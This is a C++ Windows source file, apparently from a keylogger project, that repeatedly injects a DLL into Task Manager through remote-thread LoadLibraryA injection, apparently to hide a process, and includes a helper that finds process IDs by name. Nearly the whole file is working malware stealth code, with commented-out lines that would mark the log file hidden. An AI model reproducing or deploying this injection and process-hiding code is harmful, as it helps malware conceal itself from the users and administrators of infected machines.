#include "header.h"
#include <ctype.h>
#include <tlhelp32.h>
#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

int getProcID(const char *p_name);
bool inject(char *injectProcess, char *absolutPathForDll);

unsigned _stdcall hideProc(void* pArguments)
{
	while (stopThreadHideProc) {
		inject("Taskmgr.exe", pathdll);
		Thread::Sleep(3000);
	}
	_endthreadex(0);
	return 0;
}

bool inject(char *injectProcess, char *absolutPathForDll) {
	static wchar_t namefile[] = L"E:\\learning\\courses\\logger2\\x64\\Debug\\inf.txt";
		//SetFileAttributes(LPCWSTR(namefile), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	std::ofstream log(namefile, std::ios::app); //opens log file 
	log << "Start inject" << std::endl;
	DWORD dwPid = getProcID(injectProcess); //= getProcessHandle((LPCTSTR)"Taskmgr.exe"), lpID = 0;
	if (dwPid == 0) return false;
	DWORD lpID = 0;
	/* inject dll name */
	LPCSTR lpDllName = (LPCSTR)absolutPathForDll;
	SIZE_T lpSize = lstrlenA(lpDllName) + 1, lpWritten = 0;

	/* open injection process with all access */
	log << "Open process" << std::endl;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,dwPid);
	if (!hProcess) {
		log << "Process not loaded" << std::endl;
		return false;
	}
	/* apply for an area in memory of injection process to store dll file */
	log << "Allocate memory" << std::endl;
	char *lpBuf = (char *)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
	if (lpBuf == NULL) {
		log << "Memory not allocated" << std::endl;
		return false;
	}
	/* write dll path into injection process */
	log << "Write dll path" << std::endl;
	if (!WriteProcessMemory(hProcess, lpBuf, (LPVOID)lpDllName,	lpSize,	&lpWritten) || lpSize != lpWritten) {
		/* free the area applied if failed */
		VirtualFreeEx(hProcess,	lpBuf, lpSize, MEM_DECOMMIT);
		log << "Dll path not writed" << std::endl;
		return false;
	}
	/* get path for LoadLibraryA, since loading path for
	Kernel32.dll is same to every application. */
	LPTHREAD_START_ROUTINE pfn =(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T("kernel32.dll")), "LoadLibraryA");
	/*
	create remote thread, load dll
	TODO: Fix the problem that CreateRemoteThreadEx may return an error(id 5)
	under windows 8 and higher versions.
	*/
	log << "Injecting" << std::endl;
	HANDLE hRemoteThread = CreateRemoteThreadEx(hProcess, NULL,	0, pfn,	lpBuf, 0, NULL,	&lpID);
	if (hRemoteThread == NULL) {
		/* free the area applied if failed */
		VirtualFreeEx(hProcess,	lpBuf, lpSize, MEM_DECOMMIT);
		log << "Injecting is crashing" << std::endl;
		return false;

	}

	WaitForSingleObject(hRemoteThread, INFINITE);
	log << "Injecting complete!" << std::endl;
	/* free the area applied  */
	VirtualFreeEx(hProcess,	lpBuf, lpSize, MEM_DECOMMIT);
	CloseHandle(hRemoteThread);
	CloseHandle(hProcess);
	log.close();
	return true;
}
int getProcID(const char *p_name)
{
	static wchar_t namefile[] = L"E:\\learning\\courses\\logger2\\x64\\Debug\\inf.txt";
	//SetFileAttributes(LPCWSTR(namefile), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	std::ofstream log(namefile, std::ios::app); //opens log file 
	log << "FNC[getProcID]" << std::endl;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 structprocsnapshot = { 0 };

	structprocsnapshot.dwSize = sizeof(PROCESSENTRY32);

	if (snapshot == INVALID_HANDLE_VALUE)return 0;
	if (Process32First(snapshot, &structprocsnapshot) == FALSE)return 0;

	while (Process32Next(snapshot, &structprocsnapshot))
	{
		size_t i;
		char tempname[MAX_PATH];
		wcstombs_s(&i,tempname,MAX_PATH, structprocsnapshot.szExeFile, wcslen(structprocsnapshot.szExeFile) + 1);
		if (!strcmp(tempname, (char*) p_name))
		{
			CloseHandle(snapshot);
			log << "[+]Process name is: " << p_name << "\n[+]Process ID: " << structprocsnapshot.th32ProcessID << std::endl;
			log.close();
			return structprocsnapshot.th32ProcessID;
		}
	}
	CloseHandle(snapshot);
	log << "[!]Unable to find Process ID" << std::endl;
	log.close();
	return 0;

}
